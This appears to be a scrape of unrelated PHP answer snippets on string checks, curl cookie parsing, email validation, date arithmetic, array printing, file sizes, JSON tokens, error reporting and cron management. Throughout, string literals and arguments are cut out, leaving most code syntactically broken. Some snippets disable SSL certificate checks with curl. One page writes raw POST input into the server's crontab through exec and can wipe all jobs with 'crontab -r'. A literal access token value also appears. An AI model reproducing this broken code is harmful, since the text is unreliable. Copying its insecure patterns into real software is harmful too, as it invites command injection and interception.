unset($_REQUEST); function GetRequest($key, $default = null, $source = { if ($source == if (isset($_GET[$key])) { return $_GET[$key]; } else { return $default; } } else if ($source == if (isset($_POST[$key])) { return $_POST[$key]; } else { return $default; } } else if ($source == if (isset($_COOKIE[$key])) { return $_COOKIE[$key]; } else { return $default; } } else { if (isset($_GET[$key])) { return $_GET[$key]; } else if (isset($_POST[$key])) { return $_POST[$key]; } else if (isset($_COOKIE[$key])) { return $_COOKIE[$key]; } else { return $default; } } }
$endsWith = substr( $str, -strlen( $test ) ) == $test
substr_compare($str, $test, strlen($str)-strlen($test), strlen($test)) === 0;
function endswith($string, $test) { $strlen = strlen($string); $testlen = strlen($test); if ($testlen > $strlen) return false; return substr_compare($string, $test, $strlen - $testlen, $testlen) === 0; }
stripos(strrev($haystack), $reversed_needle) === 0;
$endsWith = substr_compare( $str, $test, -strlen( $test ) ) === 0
function stringEndsWith($whole, $end) { return (strpos($whole, $end, strlen($whole) - strlen($end)) !== false); }
strrpos($str, $test) == strlen($str) - strlen($test)
$content = "The main string to search"; $search = "search"; if(stripos($content, $search) === 0) echo else echo if(strpos($content, $search) === 0) echo else echo if(stripos(strrev($content), strrev($search)) === 0) echo else echo if(strpos(strrev($content), strrev($search)) === 0) echo else echo
(array_pop(str_split($string)) === $test) ? true : false; ($string[strlen($string)-1] === $test) ? true : false; (strrev($string)[0] === $test) ? true : false;
echo (preg_match("/@gmail\.com$/","example-email@gmail.com"))?
function endsWith ($ends, $string) { $strLength = strlen ($string); $endsLength = strlen ($ends); for ($i = 0; $i < $endsLength; $i++) { if ($string [$strLength - $i - 1] !== $ends [$i]) return false; } return true; }
$ch = curl_init( curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 1); $result = curl_exec($ch); preg_match_all( $cookies = array(); foreach($matches[1] as $item) { parse_str($item, $cookie); $cookies = array_merge($cookies, $cookie); } var_dump($cookies);
$cookies = Array(); $ch = curl_init( curl_setopt($ch, CURLOPT_HEADERFUNCTION, "curlResponseHeaderCallback"); $result = curl_exec($ch); var_dump($cookies); function curlResponseHeaderCallback($ch, $headerLine) { global $cookies; if (preg_match( $cookies[] = $cookie; return strlen($headerLine); }
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 1); $result = curl_exec($ch); curl_close($ch); $headers = http_parse_headers($result); $cookobjs = Array(); foreach($headers AS $k => $v){ if (strtolower($k)=="set-cookie"){ foreach($v AS $k2 => $v2){ $cookobjs[] = http_parse_cookie($v2); } } } $cookies = Array(); foreach($cookobjs AS $row){ $cookies[] = $row->cookies; } $tmp = Array(); foreach($cookies AS $v){ foreach ($v AS $k1 => $v1){ $tmp[$k1]=$v1; } } $cookies = $tmp; print_r($cookies);
<?php header("content-type: text/plain;charset=utf8"); $ch=curl_init(); $headers=array(); $cookies=array(); $debuginfo=""; $body=""; curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $body=hhb_curl_exec2($ch, var_dump(
function hhb_curl_exec2($ch, $url, &$returnHeaders = array(), &$returnCookies = array(), &$verboseDebugInfo = "") { $returnHeaders = array(); $returnCookies = array(); $verboseDebugInfo = ""; if (!is_resource($ch) || get_resource_type($ch) !== throw new InvalidArgumentException( } if (!is_string($url)) { throw new InvalidArgumentException( } $verbosefileh = tmpfile(); $verbosefile = stream_get_meta_data($verbosefileh); $verbosefile = $verbosefile[ curl_setopt($ch, CURLOPT_VERBOSE, 1); curl_setopt($ch, CURLOPT_STDERR, $verbosefileh); curl_setopt($ch, CURLOPT_HEADER, 1); $html = hhb_curl_exec($ch, $url); $verboseDebugInfo = file_get_contents($verbosefile); curl_setopt($ch, CURLOPT_STDERR, NULL); fclose($verbosefileh); unset($verbosefile, $verbosefileh); $headers = array(); $crlf = "\x0d\x0a"; $thepos = strpos($html, $crlf . $crlf, 0); $headersString = substr($html, 0, $thepos); $headerArr = explode($crlf, $headersString); $returnHeaders = $headerArr; unset($headersString, $headerArr); $htmlBody = substr($html, $thepos + 4); unset($html); $grabCookieName = function($str) { $ret = ""; $i = 0; for ($i = 0; $i < strlen($str); ++$i) { if ($str[$i] === continue; } if ($str[$i] === break; } $ret .= $str[$i]; } return urldecode($ret); }; foreach ($returnHeaders as $header) { /*Set-Cookie:ci_spill=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22305d3d67b8016ca9661c3b032d4319df%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%2285.164.158.128%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F43.0.2357.132+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1436874639%3B%7Dcab1dd09f4eca466660e8a767856d013; expires=Tue, 14-Jul-2015 13:50:39 GMT; path=/ Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT; // */ if (stripos($header, "Set-Cookie:") !== 0) { continue; /**/ } $header = trim(substr($header, strlen("Set-Cookie:"))); while (strlen($header) > 0) { $cookiename = $grabCookieName($header); $returnCookies[$cookiename] = $header = substr($header, strlen($cookiename) + 1); if (strlen($header) < 1) { break; } ; $thepos = strpos($header, if ($thepos === false) { $returnCookies[$cookiename] = urldecode($header); break; } $returnCookies[$cookiename] = urldecode(substr($header, 0, $thepos)); $header = trim(substr($header, $thepos + 1)); } } unset($header, $cookiename, $thepos); return $htmlBody; } function hhb_curl_exec($ch, $url) { static $hhb_curl_domainCache = ""; if (!is_resource($ch) || get_resource_type($ch) !== throw new InvalidArgumentException( } if (!is_string($url)) { throw new InvalidArgumentException( } $tmpvar = ""; if (parse_url($url, PHP_URL_HOST) === null) { if (substr($url, 0, 1) !== $url = $hhb_curl_domainCache . } else { $url = $hhb_curl_domainCache . $url; } } ; curl_setopt($ch, CURLOPT_URL, $url); $html = curl_exec($ch); if (curl_errno($ch)) { throw new Exception( } if ($html === throw new Exception( } ; $hhb_curl_domainCache = parse_url(curl_getinfo($ch, CURLINFO_EFFECTIVE_URL), PHP_URL_HOST); return $html; }
curl_setopt($ch, CURLOPT_HEADER, 1); $res = curl_exec($ch); $lines = explode("\n", $res); $headers = array(); $body = ""; foreach($lines as $num => $line){ $l = str_replace("\r", "", $line); if(trim($l) == ""){ $headers = array_slice($lines, 0, $num); $body = $lines[$num + 1]; $cookies = preg_grep( break; } }
<p> <label for="post_category"> Cat 1 </label> <input type="checkbox" name="post_category{first}" value="cat1"> <br /> <label for="post_category{second}"> Cat 2 </label> <input type="checkbox" name="post_category" value="cat2"> </p>
<form method="post"> <input type="submit" name="treasure" value="go!"> </form>
if (isset($_POST[ echo "treasure will be set if the form has been submitted (to TRUE, I believe)"; }
<form action="" method="POST" id="formaddtask"> Add Task: <input type="text"name="newtaskname" /> <input type="submit" value="Submit"/> </form> if($_SERVER[ }
if($_SERVER[ echo "stuff is happening now"; } <input type="submit" name="add" value="Submit">
<<<VARIABLE this is some random text that I here and I will end it with the same word I started it with VARIABLE
function isValidEmail($email){ $pattern = "^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$"; if (eregi($pattern, $email)){ return true; } else { return false; } }
function isValidEmail($email){ return filter_var($email, FILTER_VALIDATE_EMAIL) !== false; }
function isValidEmail($email) { return filter_var($email, FILTER_VALIDATE_EMAIL) && preg_match( }
function valid_email($email) { if(is_array($email) || is_numeric($email) || is_bool($email) || is_float($email) || is_file($email) || is_dir($email) || is_int($email)) return false; else { $email=trim(strtolower($email)); if(filter_var($email, FILTER_VALIDATE_EMAIL)!==false) return $email; else { $pattern = return (preg_match($pattern, $email) === 1) ? $email : false; } } }
function validEmail($email){ if (!preg_match("/^[^@]{1,64}@[^@]{1,255}$/", $email)) { return false; } $email_array = explode("@", $email); $local_array = explode(".", $email_array[0]); for ($i = 0; $i < sizeof($local_array); $i++) { if (!preg_match("/^(([A-Za-z0-9! return false; } } if (!preg_match("/^\[?[0-9\.]+\]?$/", $email_array[1])) { $domain_array = explode(".", $email_array[1]); if (sizeof($domain_array) < 2) { return false; } for ($i = 0; $i < sizeof($domain_array); $i++) { if (!preg_match("/^(([A-Za-z0-9][A-Za-z0-9-]{0,61}[A-Za-z0-9])|([A-Za-z0-9]+))$/", $domain_array[$i])) { return false; } } } return true; }
{lhs: "1 British pound",rhs: "1.6132 U.S. dollars",error: "",icc: true}
function convert_currency($amount, $from_code, $to_code){ ini_set( $temp = $response = file_get_contents($temp); $result_string = explode( $final_result = $result_string[ $float_result = preg_replace("/[^0-9\.]/", return $float_result; }
function get_exchange_rate($from, $to){ $data = file_get_contents("http: preg_match( return $m[1]; }
class FacebookRestClient { ... public function &users_hasAppPermission($ext_perm, $uid=null) { return $this->call_method( array( } ... }
$populationCount = 120; function &getPopulationCount() { global $populationCount; return $populationCount; } $countryPopulation =& getPopulationCount(); $countryPopulation++; echo "\$populationCount = $populationCount\n"; echo "\$countryPopulation = $countryPopulation\n";
$i=30; echo $date = strtotime(date("Y-m-d", strtotime($date)) . " +".$i."days");
function addDayswithdate($date,$days){ $date = strtotime("+".$days." days", strtotime($date)); return date("Y-m-d", $date); }
$date = new DateTime(); $date->modify( print $date->format(
$today = "2015-06-15"; $fiveDays = date ("Y-m-d", strtotime ($today ."+5 days")); echo $fiveDays;
function add_days($date, $days) { $timeStamp = strtotime(date( $timeStamp+= 24 * 60 * 60 * $days; if (date("I",$timeStamp) != date("I",$date)) { if (date("I",$date)=="1") { $timeStamp+= 60 * 60; } else { $timeStamp-= 60 * 60; } } $cur_dat = mktime(0, 0, 0, date("n", $timeStamp), date("j", $timeStamp), date("Y", $timeStamp) ); return $cur_dat; }
$date = "04/28/2013 07:30:00"; $dates = explode(" ",$date); $date = strtotime($dates[0]); $date = strtotime("+6 days", $date); echo date(
$date = "**2-4-2016**"; echo date("d-m-Y",strtotime($date.** **4-4-2016**
/** * $date self explanatory * $diff the difference to add or subtract: e.g. * $format the format for $date **/ function addDate($date = if (empty($date) || empty($diff)) return false; $formatedDate = reformatDate($date, $format, $to_format = $newdate = strtotime($diff, strtotime($formatedDate)); return date($format, $newdate); } function reformatDate($date, $from_format = $date_aux = date_create_from_format($from_format, $date); return date_format($date_aux,$to_format); }
date_default_timezone_set("asia/kolkata"); $pastdate= $addYear=1; $addMonth=3; $addWeek=2; $addDays=5; $newdate=date( echo $newdate;
$EndDateTime = DateTime::createFromFormat( $EndDateTime->modify( echo $EndDateTime->format(
function pp($arr){ $retStr = if (is_array($arr)){ foreach ($arr as $key=>$val){ if (is_array($val)){ $retStr .= }else{ $retStr .= } } } $retStr .= return $retStr; }
$array=array("foo"=>"999","bar"=>"888","poo"=>array("x"=>"111","y"=>"222","z"=>"333")); echo "<pre>".print_r($array,true)."</pre>";
function print_array($title,$array){ if(is_array($array)){ echo $title."<br/>". "||---------------------------------||<br/>". "<pre>"; print_r($array); echo "</pre>". "END ".$title."<br/>". "||---------------------------------||<br/>"; }else{ echo $title." is not an array."; } }
PETS ||---------------------------------|| Array ( [0] => cat [1] => dog [2] => bird [3] => mouse [4] => fish [5] => gerbil ) END PETS ||---------------------------------||
print "session: <br><pre>".print_r($_SESSION, true)."</pre><BR>";
<?php function json_format($json) { $tab = " "; $new_json = ""; $indent_level = 0; $in_string = false; $json_obj = json_decode($json); if($json_obj === false) return false; $json = json_encode($json_obj); $len = strlen($json); for($c = 0; $c < $len; $c++) { $char = $json[$c]; switch($char) { case case if(!$in_string) { $new_json .= $char . "\n" . str_repeat($tab, $indent_level+1); $indent_level++; } else { $new_json .= $char; } break; case case if(!$in_string) { $indent_level--; $new_json .= "\n" . str_repeat($tab, $indent_level) . $char; } else { $new_json .= $char; } break; case if(!$in_string) { $new_json .= ",\n" . str_repeat($tab, $indent_level); } else { $new_json .= $char; } break; case if(!$in_string) { $new_json .= ": "; } else { $new_json .= $char; } break; case if($c > 0 && $json[$c-1] != { $in_string = !$in_string; } default: $new_json .= $char; break; } } return $new_json; } ?>
<?php function svar_dump($vInput, $iLevel = 1, $maxlevel=7) { $bg[1] = " $bg[2] = " $bg[3] = " $bg[4] = " $bg[5] = "white"; $bg[6] = " $bg[7] = " $bg[8] = "yellow"; $bg[9] = " for ($i=10; $i<1000; $i++) $bg[$i] = $bg[$i%9 +1]; if($iLevel == 1) $brs= $return = <<<EOH </select></script></textarea><!--"> <tr style= <td align= EOH; if (is_int($vInput)) { $return .= gettype($vInput)." (<b style= } else if (is_float($vInput)) { $return .= gettype($vInput)." (<b style= } else if (is_string($vInput)) { $return .= "<pre style= } else if (is_bool($vInput)) { $return .= gettype($vInput)."(<b style= } else if (is_array($vInput) or is_object($vInput)) { reset($vInput); $return .= gettype($vInput); if (is_object($vInput)) { $return .= " <b style= if (get_parent_class($vInput)=="") $return.="stdClass"; $return.="</b>"; $vInput->class_methods="\n".implode(get_class_methods($vInput),"();\n"); } $return .= " count = [<b>" . count($vInput) . "</b>] dimension = [<b style= <tr><td style= $return .= <<<EOH <table border= EOH; while (list($vKey, $vVal) = each($vInput)){ $return .= "<tr><td align= $return .= (is_int($vKey)) ? "" : "\""; $return .= _nbsp_replace(_my_html_special_chars($vKey)); $return .= (is_int($vKey)) ? "" : "\""; $return .= "</b></td><td bgcolor= <td bgcolor= if ($iLevel>$maxlevel and is_array($vVal)) $return .= svar_dump("array(".sizeof($vVal)."), but Recursion Level > $maxlevel!!", ($iLevel + 1), $maxlevel); else if ($iLevel>$maxlevel and is_object($vVal)) $return .= svar_dump("Object, but Recursion Level > $maxlevel!!", ($iLevel + 1), $maxlevel); else $return .= svar_dump($vVal, ($iLevel + 1), $maxlevel) . "</b></td></tr>"; } $return .= "</table>"; } else { if (gettype($vInput)=="NULL") $return .="null"; else $return .=gettype($vInput); if (($vInput)!="") $return .= " (<b style= } $return .= "</table>"; return $return; } function _nbsp_replace($t){ return str_replace(" ","&nbsp;",$t); } function _my_html_special_chars($t,$double_encode=true){ if(version_compare(PHP_VERSION, return htmlspecialchars($t,ENT_IGNORE, } else if(version_compare(PHP_VERSION, return htmlspecialchars($t,ENT_COMPAT, } else { return htmlspecialchars($t,ENT_COMPAT, } }
ob_start() ; print_r( $json ); $ob_out=ob_get_contents(); ob_end_clean(); echo "\$json".str_replace(
[root] => 1 [sub1] => Array ( ) [sub2] => Array ( ) [sub3] => Array ( ) [sub4] => Array ( )...
$something = array(1,2,3); $some_string = var_export($something, true);
function pp($arr){ if (is_object($arr)) $arr = (array) $arr; $retStr = if (is_array($arr)){ foreach ($arr as $key=>$val){ if (is_object($val)) $val = (array) $val; if (is_array($val)){ $retStr .= }else{ $retStr .= } } } $retStr .= return $retStr; }
function pretty($arr, $level=0){ $tabs = ""; for($i=0;$i<$level; $i++){ $tabs .= " "; } foreach($arr as $key=>$val){ if( is_array($val) ) { print ($tabs . $key . " : " . "\n"); pretty($val, $level + 1); } else { if($val && $val !== 0){ print ($tabs . $key . " : " . $val . "\n"); } } } } $item["A"] = array("a", "b", "c"); $item["B"] = array("a", "b", "c"); $item["C"] = array("a", "b", "c"); pretty($item);
<?php echo var_dump($your_array); var_export($your_array); print_r($your_array); echo ?>
function pp($arr){ $retStr = if (is_array($arr)){ foreach ($arr as $key=>$val){ if (is_array($val)){ $retStr .= }else{ $retStr .= } } } $retStr .= return $retStr; }
$x= array(1,2,3); echo "<pre>".var_export($x,1)."</pre>";
string : "Test string" boolean : true integer : 17 float : 9.99 array (array) bob : "alice" 1 : 5 2 : 1.4 object (test2) another (test3) string1 : "3d level" string2 : "123" complicated (test4) enough : "Level 4"
<?php function formatSizeUnits($bytes) { if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . } elseif ($bytes > 1) { $bytes = $bytes . } elseif ($bytes == 1) { $bytes = $bytes . } else { $bytes = } return $bytes; } ?>
function filesize_formatted($path) { $size = filesize($path); $units = array( $power = $size > 0 ? floor(log($size, 1024)) : 0; return number_format($size / pow(1024, $power), 2, }
function Size($path) { $bytes = sprintf( if ($bytes > 0) { $unit = intval(log($bytes, 1024)); $units = array( if (array_key_exists($unit, $units) === true) { return sprintf( } } return $bytes; }
public function sizeFilter( $bytes ) { $label = array( for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ ); return( round( $bytes, 2 ) . " " . $label[$i] ); }
/** * Formats filesize in human readable way. * * @param file $file * @return string Formatted Filesize, e.g. "113.24 MB". */ function filesize_formatted($file) { $bytes = filesize($file); if ($bytes >= 1073741824) { return number_format($bytes / 1073741824, 2) . } elseif ($bytes >= 1048576) { return number_format($bytes / 1048576, 2) . } elseif ($bytes >= 1024) { return number_format($bytes / 1024, 2) . } elseif ($bytes > 1) { return $bytes . } elseif ($bytes == 1) { return } else { return } }
function size2Byte($size) { $units = array( $currUnit = while (count($units) > 0 && $size > 1024) { $currUnit = array_shift($units); $size /= 1024; } return ($size | 0) . $currUnit; }
<?php $units = explode( echo("<html><body>"); echo( echo("</body></html>"); function format_size($size) { $mod = 1024; for ($i = 0; $size > $mod; $i++) { $size /= $mod; } $endIndex = strpos($size, ".")+3; return substr( $size, 0, $endIndex). } ?>
function calcSize($size,$accuracy=2) { $units = array( foreach($units as $n=>$u) { $div = pow(1024,$n); if($size > $div) $output = number_format($size/$div,$accuracy).$u; } return $output; }
function getNiceFileSize($file, $digits = 2){ if (is_file($file)) { $filePath = $file; if (!realpath($filePath)) { $filePath = $_SERVER["DOCUMENT_ROOT"] . $filePath; } $fileSize = filesize($filePath); $sizes = array("TB", "GB", "MB", "KB", "B"); $total = count($sizes); while ($total-- && $fileSize > 1024) { $fileSize /= 1024; } return round($fileSize, $digits) . " " . $sizes[$total]; } return false; }
function calculateFileSize($size) { $sizes = [ $count=0; if ($size < 1024) { return $size . " " . $sizes[$count]; } else{ while ($size>1024){ $size=round($size/1024,2); $count++; } return $size . " " . $sizes[$count]; } }
function format_bytes($bytes, $precision = 2) { $units = array( $bytes = max($bytes, 0); $pow = floor(($bytes ? log($bytes) : 0) / log(1000)); $pow = min($pow, count($units) - 1); $bytes /= pow(1000, $pow); return round($bytes, $precision) . }
{ "expires_in":5180976, "access_token":"AQXzQgKTpTSjs-qiBh30aMgm3_Kb53oIf-VA733BpAogVE5jpz3jujU65WJ1XXSvVm1xr2LslGLLCWTNV5Kd_8J1YUx26axkt1E-vsOdvUAgMFH1VJwtclAXdaxRxk5UtmCWeISB6rx6NtvDt7yohnaarpBJjHWMsWYtpNn6nD87n0syud0" }
$json = file_get_contents( $obj = json_decode($json); echo $obj->access_token;
$ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL, $result = curl_exec($ch); curl_close($ch); $obj = json_decode($result); echo $obj->access_token;
$url = $obj = json_decode(file_get_contents($url), true); echo $obj[
garex@ustimenko ~/src/ekapusta/deploy $ psysh Psy Shell v0.4.4 (PHP 5.5.3-1ubuntu2.6 — cli) by Justin Hileman >>> $q = new stdClass; => <stdClass >>> $q->{ => 123 >>> var_dump($q); class stdClass public $qwert-y => int(123) } => null
$url = "http: $json = file_get_contents($url); $json_data = json_decode($json, true); echo "My token: ". $json_data["access_token"];
$json = file_get_contents( $obj = json_decode($json); var_dump($obj->results[0]->formatted_address);
$json = $obj = json_decode($json); var_dump($obj-> access_token); $arr = json_decode($json, true); var_dump($arr[
$ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL, $result = curl_exec($ch); curl_close($ch); $obj = json_decode($result); echo $obj->access_token;
$ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL, $url); $result = curl_exec($ch); curl_close($ch); if (! $result) { return false; } $json = json_decode(utf8_encode($result)); if (empty($json) || json_last_error() !== JSON_ERROR_NONE) { return false; }
php_value display_errors 1 php_value display_startup_errors 1 php_value error_reporting 2147483647
<?php ini_set( ini_set( error_reporting(-1); function ShutdownHandler() { if(@is_array($error = @error_get_last())) { return(@call_user_func_array( }; return(TRUE); }; register_shutdown_function( function ErrorHandler($type, $message, $file, $line) { $_ERRORS = Array( 0x0001 => 0x0002 => 0x0004 => 0x0008 => 0x0010 => 0x0020 => 0x0040 => 0x0080 => 0x0100 => 0x0200 => 0x0400 => 0x0800 => 0x1000 => 0x2000 => 0x4000 => ); if(!@is_string($name = @array_search($type, @array_flip($_ERRORS)))) { $name = }; return(print(@sprintf("%s Error in file \xBB%s\xAB at line %d: %s\n", $name, @basename($file), $line, $message))); }; $old_error_handler = set_error_handler("ErrorHandler"); ?>
function shutdown(){ var_dump(error_get_last()); } register_shutdown_function(
/* APPLICATION_LIVE will be used in process to tell if we are in a development or production environment. It */ if ( preg_match( "%^(www.)?livedomain.com$%", $_SERVER["HTTP_HOST"]) ) { define( } elseif ( preg_match( "%^(www.)?devdomain.net$%", $_SERVER["HTTP_HOST"]) ) { define( } else { die("INVALID HOST REQUEST (".$_SERVER["HTTP_HOST"].")"); } error_reporting(E_ALL & ~E_STRICT); ini_set ( "display_errors", "0"); ini_set ( "display_startup_errors", "0"); ini_set ( "log_errors", 1); ini_set ( "log_errors_max_len", 0); ini_set ( "error_log", APPLICATION_ROOT."logs/php_error_log.txt"); ini_set ( "display_errors", "0"); ini_set ( "display_startup_errors", "0"); if ( ! APPLICATION_LIVE ) { ini_set ( "display_errors", "1"); ini_set ( "display_startup_errors", "1"); ini_set ( "html_errors", "1"); ini_set ( "docref_root", "http: ini_set ( "error_prepend_string", "<div style= ini_set ( "error_append_string", "</div>"); }
error_reporting(E_ALL & ~E_DEPRECATED); or error_reporting(0);
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
c:\wamp\bin\php\php5.4.12\php.ini (so you need to enable openssl there)
extension_dir = "C:\php-sdk\bin\phpdev\vc14\x64\php-7.0.13-src\x64\Release_TS"
use One\Classes\Resp; use xampp\htdocs\One\Classes\Resp; use htdocs\One\Classes\Resp; use One\Classes; use htdocs\One\Classes; $a = new Resp();
use SMTP\Mailer as SMTPMailer; use Mailgun\Mailer as MailgunMailer;
$smtp_mailer = new SMTPMailer; $mailgun_mailer = new MailgunMailer;
use Symfony\Component\Debug\Debug; if ($_SERVER[ Debug::enable(); }
trait Stuff { private $baz = public function bar() { return $this->baz; } } class Cls { use Stuff; } $foo = new Cls; echo $foo->bar();
use album/className; class album extends classname { }
class foobar { public $foo; public function __construct() { global $foo; $this->foo = $foo; } public function foobarfunc() { return $this->foo(); } public function foo() { return $this->foo; } }
static $foo; public static function foo() { return self::$foo; }
public function foobarfunc() { return $this->foo(); }
Strict Standards: Non-static method foobar::foobarfunc() should not be called statically
class foobar { static function foobarfunc() { return $this->foo(); } }
usage: crontab [-u user] file crontab [-u user] [ -e | -l | -r ] (default operation is replace, per 1003.2) -e (edit user -l (list user -r (delete user -i (prompt before deleting user
$output = shell_exec( file_put_contents( echo exec(
bin/cronman --enable /var/www/myproject/.cronfile --user www-data
use php\manager\crontab\CrontabManager; $crontab = new CrontabManager(); $crontab->enableOrUpdate( $crontab->save();
use php\manager\crontab\CrontabManager; $crontab = new CrontabManager(); $job = $crontab->newJob(); $job->on( $job->onMinute( $crontab->add($job); $job->onMinute( $crontab->add($job); $crontab->save();
function cronjob_exists($command){ $cronjob_exists=false; exec( if(isset($crontab)&&is_array($crontab)){ $crontab = array_flip($crontab); if(isset($crontab[$command])){ $cronjob_exists=true; } } return $cronjob_exists; }
function append_cronjob($command){ if(is_string($command)&&!empty($command)&&cronjob_exists($command)===FALSE){ exec( } return $output; }
exec( append_cronjob( append_cronjob( append_cronjob(
<?php $output = shell_exec( <?php $cron_file = "/tmp/crontab.txt"; ?> <!-- Execute script when form is submitted --> <?php if(isset($_POST[ <!-- Add new cron job --> <?php if(!empty($_POST[ <?php file_put_contents($cron_file, $output.$_POST[ <?php } ?> <!-- Remove cron job --> <?php if(!empty($_POST[ <?php $remove_cron = str_replace($_POST[ <?php file_put_contents($cron_file, $remove_cron.PHP_EOL); ?> <?php } ?> <!-- Remove all cron jobs --> <?php if(isset($_POST[ <?php echo exec("crontab -r"); ?> <?php } else { ?> <?php echo exec("crontab $cron_file"); ?> <?php } ?> <!-- Reload page to get updated cron jobs --> <?php $uri = $_SERVER[ <?php header("Location: $uri"); ?> <?php exit; ?> <?php } ?> <b>Current Cron Jobs:</b><br> <?php echo nl2br($output); ?> <h2>Add or Remove Cron Job</h2> <form method="post" action="<?php $_SERVER[ <b>Add New Cron Job:</b><br> <input type="text" name="add_cron" size="100" placeholder="e.g.: * * * * * /usr/local/bin/php -q /home/username/public_html/my_cron.php"><br> <b>Remove Cron Job:</b><br> <input type="text" name="remove_cron" size="100" placeholder="e.g.: * * * * * /usr/local/bin/php -q /home/username/public_html/my_cron.php"><br> <input type="checkbox" name="remove_all_cron" value="1"> Remove all cron jobs?<br> <input type="submit"><br> </form>
class Crontab { static private function stringToArray($jobs = $array = explode("\r\n", trim($jobs)); foreach ($array as $key => $item) { if ($item == unset($array[$key]); } } return $array; } static private function arrayToString($jobs = array()) { $string = implode("\r\n", $jobs); return $string; } static public function getJobs() { $output = shell_exec( return self::stringToArray($output); } static public function saveJobs($jobs = array()) { $output = shell_exec( return $output; } static public function doesJobExist($job = $jobs = self::getJobs(); if (in_array($job, $jobs)) { return true; } else { return false; } } static public function addJob($job = if (self::doesJobExist($job)) { return false; } else { $jobs = self::getJobs(); $jobs[] = $job; return self::saveJobs($jobs); } } static public function removeJob($job = if (self::doesJobExist($job)) { $jobs = self::getJobs(); unset($jobs[array_search($job, $jobs)]); return self::saveJobs($jobs); } else { return false; } }
function ajaxHandler(response){ alert(response.text); }
echo echo echo <script>var returndata="{"text":"omrele"}";</script>
def download_json(request): print("Downloading json") return HttpResponse(render_to_response("template_file.json",dict(name="Alex Vera")),content_type="application/json")
$.ajax({ url: }).done(function(data){ console.log( console.log( alert( });
$variable = substr($variable, 0, strpos($variable, "By"));
function strip_after_string($str,$char) { $pos=strpos($str,$char); if ($pos!==false) { return substr($str,0,$pos); } else { return $str; } }
<?php $clean_string= strip_after_string ("Apples, Oranges, Banannas",","); ?>
$var = "Posted On April 6th By Some Dude"; $new_var = substr($var, 0, strpos($var, " By"));
$sInputString = "Posted On April 6th By Some Dude"; $sControl = "By"; $iPosition = strpos($sInputString, " ".$sControl); if ($iPosition !== false) $sResult = substr($sInputString, 0, $iPosition); else $sResult = $sInputString;
$sInputString = "Posted On April 6th By Some Dude"; $pControl = "By"; $sResult = preg_replace("
$sInputString = "Posted On April 6th By Some Dude"; $pControl = "[0-9]{1,2}[a-z]{2}"; $sResult = preg_replace("
$sInputString = "Posted On April 6th By Some Dude"; $pPattern = " if (preg_match($pPattern, $sInputString, $aMatch)) { } else { }
list($result) = explode("By", "Posted On April 6th By Some Dude", 2);
<?php $myString = "Posted On April 6th By Some Dude"; $result = strstr($myString, echo $result ;
$page = $_SERVER[ $sec = "10"; header("Refresh: $sec; url=$page");
echo "<meta http-equiv=\"refresh\" content=\"0;URL=upload.php\">";
$.ajax({ url: data: {action: type: success: function(output) { alert(output); } });
if(isset($_POST[ $action = $_POST[ switch($action) { case case } }
P.callback(false); var strLenA = P.strlen( var strLenB = P.strlen( var totalStrLen = strLenA + strLenB; console.log( totalStrLen ); var data1 = P.crypt("Some Crypt String").data(); console.log( data1 );
var data1 = P.strtoupper("u,p,p,e,r,c,a,s,e").strstr([], "C,A,S,E").explode(",", [], 2).data(); var data2 = P.strtoupper("u,p,p,e,r,c,a,s,e").strstr([], "C,A,S,E").explode(",", [], 2).end(); console.log( data1, data2 );
var data1 = P.block({ $str: "Let $opts: [ { http: { method: "GET", header: "Accept-language: en\r\n" + "Cookie: foo=bar\r\n" } } ], $context: { stream_context_create: [ }, $contents: { file_get_contents: [ }, $html: { htmlentities: [ } }).data(); console.log( data1 );
{ "method": "echo", "params": ["Hello JSON-RPC"], "id": 1}
Phery::instance()->set(array( return PheryResponse::factory(); } ))->process();
Phery::instance()->set(array( $r = new PheryResponse; $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $data[ return $r->set_var($data[ } ))->process();
<? $url = $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,$url); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0); curl_setopt($ch, CURLOPT_PROXY, curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, curl_setopt ($ch, CURLOPT_HEADER, 1) curl_exec ($ch); $curl_info = curl_getinfo($ch); curl_close($ch); echo print_r($curl_info); ?>
